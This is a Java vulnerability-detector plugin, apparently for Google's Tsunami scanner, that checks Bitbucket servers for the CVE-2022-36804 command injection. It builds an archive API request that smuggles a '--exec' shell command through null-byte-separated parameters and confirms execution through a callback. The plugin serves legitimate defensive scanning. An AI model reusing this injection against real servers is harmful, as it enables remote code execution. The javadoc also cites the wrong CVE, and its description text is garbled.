package com.google.tsunami.plugins.detectors.bitbucket;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.*;
import com.google.tsunami.common.time.UtcClock;

import java.io.IOException;
import javax.inject.Inject;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLEncoder;
import java.time.Clock;
import java.time.Instant;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * A {@link VulnDetector} that detects the CVE-2022-0540 vulnerability. Reading
 */
@PluginInfo(
        type = PluginType.VULN_DETECTION,
        name = "Cve202236804VulnDetector",
        version = "0.1",
        description =
                "A vulnerability in Bitbucket allows a remote, An attacker with access "
                        + "to a public Bitbucket repository or with read permissions to a"
                        + "private one can execute arbitrary code by sending a malicious "
                        + "HTTP request. This All versions released after 6.10.17 "
                        + "including 7.0.0 and newer are affected, this means that all "
                        + "instances that are running any versions between 7.0.0 and "
                        + "8.3.0 inclusive can be exploited by this vulnerability.",
        author = "SuperX (SuperX.SIR@proton.me)",
        bootstrapModule = Cve202236804DetectorBootstrapModule.class)
public class Cve202236804VulnDetector implements VulnDetector {

    private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
    private static final String GET_ALL_PUB_PATH =
            "repos?visibility=public";
    private static final String STRING_PUB_REP = "Public Repositories";
    private final HttpClient httpClient;
    private final Clock utcClock;
    private final PayloadGenerator payloadGenerator;

    @Inject
    Cve202236804VulnDetector(@UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
        this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
        this.utcClock = checkNotNull(utcClock);
        this.payloadGenerator = checkNotNull(payloadGenerator);
    }

    private static boolean isWebServiceOrUnknownService(NetworkService networkService) {
        return networkService.getServiceName().isEmpty()
                || NetworkServiceUtils.isWebService(networkService);
    }

    private static String buildTargetUrl(NetworkService networkService, String url) {
        StringBuilder targetUrlBuilder = new StringBuilder();
        if (NetworkServiceUtils.isWebService(networkService)) {
            targetUrlBuilder.append(NetworkServiceUtils.buildWebApplicationRootUrl(networkService));
        } else {
            // Assume the service uses HTTP protocol when the scanner cannot identify the actual service.
            targetUrlBuilder
                    .append("http://")
                    .append(toUriAuthority(networkService.getNetworkEndpoint()))
                    .append("/");
        }
        targetUrlBuilder.append(url);
        return targetUrlBuilder.toString();
    }

    private boolean isServiceVulnerable(NetworkService networkService) {

        PayloadGeneratorConfig config =
                PayloadGeneratorConfig.newBuilder()
                        .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
                        .setInterpretationEnvironment(
                                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
                        .setExecutionEnvironment(
                                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
                        .build();

        if (!payloadGenerator.isCallbackServerEnabled()) {
            return false;
        }
        Payload payload = this.payloadGenerator.generate(config);

        String commandToInject = String.format("sh -c \"%s\"", payload.getPayload());

        String PubRepUrl = buildTargetUrl(networkService, GET_ALL_PUB_PATH);

        try {
            HttpResponse httpResponse =
                    httpClient.send(get(PubRepUrl).withEmptyHeaders().build(), networkService);
            if (httpResponse.status().code() == 200
                    && httpResponse.bodyString().get().contains(STRING_PUB_REP)) {
                String Publink = getArchiveLink(getPubLink(String.valueOf(httpResponse.bodyString())), URLEncoder.encode(commandToInject));
                if (Publink.length() == 0) {
                    return false;
                } else {
                    httpClient.send(get(buildTargetUrl(networkService, Publink)).withEmptyHeaders().build(), networkService);

                    return payload.checkIfExecuted();
                }

            }
        } catch (IOException e) {
            logger.atWarning().withCause(e).log("Request to target %s failed", networkService);
        }

        return false;
    }


    private String getPubLink(String response) {
        String publink = "";
        Matcher matcher = Pattern.compile("<script>require\\('bitbucket/internal/page/global-repository-list/global-repository-list'\\)\\.init\\( document\\.getElementById\\('repository-container'\\),\\{repositoryPage: (.*),\\}\\);</script>").matcher(response);
        if (matcher.find()) {
            String res = matcher.group(1);
            JsonElement rootElement = JsonParser.parseString(res);
            JsonObject repositoryPage = rootElement.getAsJsonObject();
            if (repositoryPage.get("size").getAsInt() > 0) {

                JsonArray values = repositoryPage.getAsJsonArray("values");
                for (int i = 0; i < repositoryPage.get("size").getAsInt(); i++) {
                    //Boolean isPublic = values.get(i).getAsJsonObject().get("public").getAsBoolean();
                    JsonArray selfs = values.get(i).getAsJsonObject().getAsJsonObject("links").getAsJsonArray("self");
                    Iterator self = selfs.iterator();
                    while (self.hasNext()) {
                        JsonElement hreflink = (JsonElement) self.next();
                        publink = hreflink.getAsJsonObject().get("href").getAsString();
                        return publink;
                    }
                }
            }
        }
        return publink;
    }

    private String getArchiveLink(String publink, String commandToInject) throws MalformedURLException {
        String archiveLink = "";
        if (publink.length() == 0) {
            return archiveLink;
        } else {
            URL url = new URL(publink);
            archiveLink = "rest/api/latest" + url.getPath().substring(0, url.getPath().lastIndexOf("/")) + "/archive?format=zip&prefix=123%00--exec=" + commandToInject +
                    "%00--remote=git@g.com/a/b";
            //logger.atInfo().log("archiveLink urldecode %s ", archiveLink);
            return archiveLink;
        }
    }

    private DetectionReport buildDetectionReport(
            TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
        return DetectionReport.newBuilder()
                .setTargetInfo(targetInfo)
                .setNetworkService(vulnerableNetworkService)
                .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
                .setVulnerability(
                        Vulnerability.newBuilder()
                                .setMainId(
                                        VulnerabilityId.newBuilder()
                                                .setPublisher("TSUNAMI_COMMUNITY")
                                                .setValue("CVE_2022_36804"))
                                .setSeverity(Severity.CRITICAL)
                                .setTitle(
                                        "CVE-2022-36804: Bitbucket Command injection vulnerability")
                                .setDescription(
                                        "A vulnerability in Bitbucket allows a remote, An attacker with access "
                                                + "to a public Bitbucket repository or with read permissions to a"
                                                + "private one can execute arbitrary code by sending a malicious "
                                                + "HTTP request. This All versions released after 6.10.17 "
                                                + "including 7.0.0 and newer are affected, this means that all "
                                                + "instances that are running any versions between 7.0.0 and "
                                                + "8.3.0 inclusive can be exploited by this vulnerability.")
                                .setRecommendation("Upgrade bitbucket to the latest version"))
                .build();
    }

    @Override
    public DetectionReportList detect(TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
        logger.atInfo().log("Cve202236804VulnDetector starts detecting.");
        return DetectionReportList.newBuilder()
                .addAllDetectionReports(
                        matchedServices.stream()
                                .filter(Cve202236804VulnDetector::isWebServiceOrUnknownService)
                                .filter(this::isServiceVulnerable)
                                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                                .collect(toImmutableList()))
                .build();
    }
}
